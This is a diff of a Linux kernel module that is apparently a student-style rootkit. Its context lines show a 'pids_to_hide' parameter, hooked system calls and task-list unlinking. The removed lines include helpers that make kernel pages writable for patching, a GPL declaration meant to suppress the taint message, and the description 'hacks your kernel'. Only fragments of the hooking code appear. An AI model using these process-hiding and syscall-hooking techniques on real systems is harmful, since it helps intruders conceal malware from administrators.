@@ -13,23 +13,7 @@
 #include <linux/sched.h>
 
 #include "sysmap.h"          /* Pointers to system functions */
-
-// since we had no problems without get/put, we commented it out
-// #define USE_MODULE_GET_PUT
-#ifdef USE_MODULE_GET_PUT
-#define OUR_TRY_MODULE_GET if (!try_module_get(THIS_MODULE)){return -EAGAIN;}
-#define OUR_MODULE_PUT module_put(THIS_MODULE)
-#else
-#define OUR_TRY_MODULE_GET 
-#define OUR_MODULE_PUT 
-#endif
-
-#define DEBUG_ON
-#ifdef DEBUG_ON
-#define OUR_DEBUG(...) printk(KERN_INFO __VA_ARGS__)
-#else
-#define OUR_DEBUG(...)
-#endif
+#include "global.h"
 
 /* the followin macros are taken from linux kernel source code (2.6.11)
    they probably remove a task from the task list - have to try it out */
@@ -74,21 +58,6 @@ static int pids_to_hide[200];
 static int pids_count = 0;
 module_param_array(pids_to_hide, int, &pids_count, 0000);
 MODULE_PARM_DESC(pids_to_hide, "Process IDs that shall be hidden.");
-
-/* Make a certain address writeable */
-void make_page_writable(long unsigned int _addr){
-    unsigned int dummy;
-    pte_t *pageTableEntry = lookup_address(_addr, &dummy);
-
-    pageTableEntry->pte |=  _PAGE_RW;
-}
-
-/* Make a certain address readonly */
-void make_page_readonly(long unsigned int _addr){
-    unsigned int dummy;
-    pte_t *pageTableEntry = lookup_address(_addr, &dummy);
-    pageTableEntry->pte = pageTableEntry->pte & ~_PAGE_RW;
-}
 
 // hooked functions
 asmlinkage ssize_t hooked_read(unsigned int fd, char __user *buf, size_t count){
@@ -290,18 +259,4 @@ static void __exit _cleanup_module(void)
 /* Declare init and exit routines */
 module_init(_init_module);
 module_exit(_cleanup_module);
-
-
-/* OTHER STUFF */
-
-/*
- * Get rid of taint message by declaring code as GPL.
- */
-MODULE_LICENSE("GPL");
-
-/*
- * Module information
- */
-MODULE_AUTHOR("Philipp Müller, Roman Karlstetter");    /* Who wrote this module? */
-MODULE_DESCRIPTION("hacks your kernel");                /* What does it do? */
 
